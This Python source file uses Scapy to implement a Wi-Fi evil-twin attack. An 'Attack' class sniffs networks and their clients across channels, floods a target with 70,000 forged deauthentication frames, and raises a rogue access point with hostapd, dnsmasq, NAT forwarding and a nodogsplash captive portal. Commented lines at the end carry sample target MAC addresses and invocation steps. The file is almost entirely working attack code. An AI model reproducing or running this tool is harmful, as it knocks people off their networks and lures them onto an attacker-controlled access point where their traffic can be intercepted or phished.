from scapy.all import *
from threading import Thread
import os 
from time import sleep
class Attack:


    listen_iface = ''
    ap_iface = ''
    ap_mac = ''
    listen_mac = ''

    chanel_number = 0

    networks = dict()
    users = dict()

    def __init__(self,listen_iface, listen_mac, ap_iface, ap_mac) -> None:
        self.listen_iface = listen_iface
        self.ap_iface = ap_iface
        self.ap_mac = ap_mac
        self.listen_mac = listen_mac

    def kill_wifi(self, target_mac, gateway_mac):
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac,type=0, subtype=12)
        # stack them up
        pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
        # send the packet
        sendp(pkt, count=70000, iface=self.listen_iface, verbose=3)

    def beacon_packet(self,ssid,forword_interface):
        os.system("bash ./before.sh")
        host_conf = f"""interface={self.ap_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=4
macaddr_acl=0
ignore_broadcast_ssid=0"""
        with open("hostapd.conf",'w') as f:
            f.write(host_conf)
        os.system('sudo hostapd hostapd.conf -B')
        dns_conf = f"""interface={self.ap_iface}
dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.2.1
"""
        with open("dnsmasq.conf",'w') as f:
            f.write(dns_conf)
        os.system(f"sudo ifconfig {self.ap_iface} up 192.168.2.1 netmask 255.255.255.0")
        os.system("sudo dnsmasq -C dnsmasq.conf -d &")
        os.system(f"sudo iptables --table nat --append POSTROUTING --out-interface {forword_interface} -j MASQUERADE")
        os.system(f"sudo iptables --append FORWARD --in-interface {self.ap_iface} -j ACCEPT")
        os.system("sudo nodogsplash")
    def reset_ap(self):
        os.system("killall hostapd")
        os.system("killall dnsmasq")

    def change_channel(self):
        while 1:
            time.sleep(3)
            os.system(f"iwconfig {self.listen_iface} channel {self.chanel_number+1}")
            self.chanel_number = (self.chanel_number+1)%13

    def sniff_attack(self):
        def print_packet(pkt):
            if pkt.haslayer(Dot11):
                dot_layer = pkt.getlayer(Dot11)
                if dot_layer.addr2 and dot_layer.payload.name == "802.11 Beacon":
                    if self.networks.get(dot_layer.addr2, None) is None:
                        self.networks[dot_layer.addr2] = (pkt[Dot11Elt].info.decode(),self.chanel_number+1)
                        print("networks")
                        print(self.networks)
                    else:
                        self.networks[dot_layer.addr2] = (pkt[Dot11Elt].info.decode(),self.chanel_number+1)

                elif pkt.type == 2:
                    DS = pkt.FCfield & 0x3
                    to_DS = DS & 0x1 != 0
                    from_DS = DS & 0x2 != 0
                    if not to_DS and from_DS:
                        if self.users.get(pkt.addr3,None) is None:
                            self.users[pkt.addr3] = pkt.addr2
                            #print("users - from")
                            #print(self.users,self.chanel_number+1) 
                        else:
                            self.users[pkt.addr3] = pkt.addr2

                    elif to_DS and not from_DS:
                        if self.users.get(pkt.addr2,None) is None:
                            self.users[pkt.addr2] = pkt.addr1
                            #print("users - to")
                            #print(self.users,self.chanel_number+1) 
                        else:
                            self.users[pkt.addr2] = pkt.addr1

        x = Thread(target=self.change_channel, args=())
        x.start()
        sniff(iface = self.listen_iface,prn = print_packet)
        x.join()

#b4:b5:b6:f2:4d:17
#b6:4c:4a:86:33:24
#a = Attack('wlx000f005d5479','00:0f:00:5d:54:79', 'wlxc4e9841c43b9','c4:e9:84:1c:43:b9')
#a.sniff_attack()
#a.kill_wifi('b4:b5:b6:f2:4d:17','b6:4c:4a:86:33:24')
#a.reset_ap()
#a.beacon_packet("ofek - for real","enp3s0")
#sleep(60)
#a.reset_ap()